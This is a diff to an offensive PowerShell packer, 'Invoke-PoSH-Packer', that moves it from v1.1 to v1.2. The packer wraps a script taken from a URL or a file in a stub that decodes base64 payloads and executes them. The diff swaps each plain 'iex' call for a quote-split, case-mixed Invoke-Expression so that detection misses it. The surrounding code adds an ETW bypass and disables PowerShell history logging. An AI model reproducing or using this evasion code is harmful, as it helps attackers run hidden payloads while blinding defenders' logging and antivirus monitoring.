@@ -20,7 +20,7 @@ Write-Output "
  | _ \___/ __| || |___| _ \___  __| |_____ _ _ 
  |  _/ _ \__ \ __ |___|  _/ _ |/ _| / / -_) '_|
  |_| \___/___/_||_|   |_| \__,|\__|_\_\___|_|  
-                                             v1.1
+                                             v1.2
 Usage: 
 > Invoke-PoSH-Packer -FileUrl https://URL/script.ps1 -OutFile C:\path\Packed-script.ps1
 > Invoke-PoSH-Packer -FilePath C:\path\script.ps1 -OutFile C:\path\Packed-script.ps1
@@ -143,7 +143,7 @@ function Invoke-PoSH-Packer {
 	$stub_template += $code_fixed_order1 -join ''
 	$code_fixed_order2 += '${18} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${17}+"2V4aXR9IGVsc2Uge1MndCdhJ1JULVNsRSdFcCAtcyA2MH07"))' + "`r`n"
         $stub_template += $code_fixed_order2 -join ''
-        $code_fixed_order3 += 'iex(${18})' + "`r`n"
+        $code_fixed_order3 += "iN'v'Oke-exPReS'S'iOn"+'(${18})' + "`r`n"
         $stub_template += $code_fixed_order3 -join ''
         }
 		
@@ -154,7 +154,7 @@ function Invoke-PoSH-Packer {
         $stub_template += $code_fixed_order5 -join ''
 	$code_fixed_order6 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
         $stub_template += $code_fixed_order6 -join ''
-        $code_fixed_order7 += 'iex(${11})' + "`r`n"
+        $code_fixed_order7 += "iN'v'Oke-exPReS'S'iOn"+'(${11})' + "`r`n"
         $stub_template += $code_fixed_order7 -join ''
         
         Write-Output "[*] Adding 'E'T'W' bypass" 
@@ -164,7 +164,7 @@ function Invoke-PoSH-Packer {
         $stub_template += $code_fixed_order9 -join ''
         $code_fixed_order10 += '${14} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${13}+${12})))' + "`r`n"
         $stub_template += $code_fixed_order10 -join ''
-        $code_fixed_order11 += 'iex(${14})' + "`r`n"
+        $code_fixed_order11 += "iN'v'Oke-exPReS'S'iOn"+'(${14})' + "`r`n"
         $stub_template += $code_fixed_order11 -join ''
         
         Write-Output "[*] Disabling PoSh history logging"
@@ -172,7 +172,7 @@ function Invoke-PoSH-Packer {
         $stub_template += $code_fixed_order12 -join ''
         $code_fixed_order13 += '${16} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${15}+"LUhpc3RvcnlTYXZlU3R5bGUgU2F2J2VOJ290aCdpbidn")))' + "`r`n"
         $stub_template += $code_fixed_order13 -join ''
-        $code_fixed_order14 += 'iex(${16})' + "`r`n"
+        $code_fixed_order14 += "iN'v'Oke-exPReS'S'iOn"+'(${16})' + "`r`n"
         $stub_template += $code_fixed_order14 -join ''
 
         $code_alternatives  = @()
